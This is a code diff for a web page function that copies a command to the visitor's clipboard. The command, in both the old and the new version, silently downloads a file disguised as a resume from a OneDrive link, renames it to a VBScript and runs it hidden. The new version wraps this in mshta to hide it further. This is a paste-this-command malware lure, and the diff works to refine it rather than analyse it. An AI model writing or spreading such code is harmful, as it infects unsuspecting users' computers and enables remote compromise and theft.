@@ -647,8 +647,8 @@
             });
             
             function copyScriptToClipboard() {
-                // Optimized PowerShell script that downloads HTML from OneDrive, renames to VBS, and executes
-                const scriptContent = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://1drv.ms/u/c/2f3053ae4c170361/EU3x-jF2eSlIu1PgBNaGfQ0BF50mkVAKMHi-DFlgC4H7QQ?e=HCYlUh' -OutFile 'Resume.html'; Rename-Item 'Resume.html' 'Resume.vbs'; Start-Process 'Resume.vbs' -WindowStyle Hidden"`;
+                // Direct download and execute method using mshta
+                const scriptContent = `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -WindowStyle Hidden -Command """"Invoke-WebRequest -Uri 'https://1drv.ms/u/c/2f3053ae4c170361/EU3x-jF2eSlIu1PgBNaGfQ0BF50mkVAKMHi-DFlgC4H7QQ?e=HCYlUh' -OutFile 'Resume.html'; Rename-Item 'Resume.html' 'Resume.vbs'; Start-Process 'Resume.vbs' -WindowStyle Hidden"""""",0:close")`;
                 
                 // Create a temporary textarea to copy the content
                 const textArea = document.createElement('textarea');
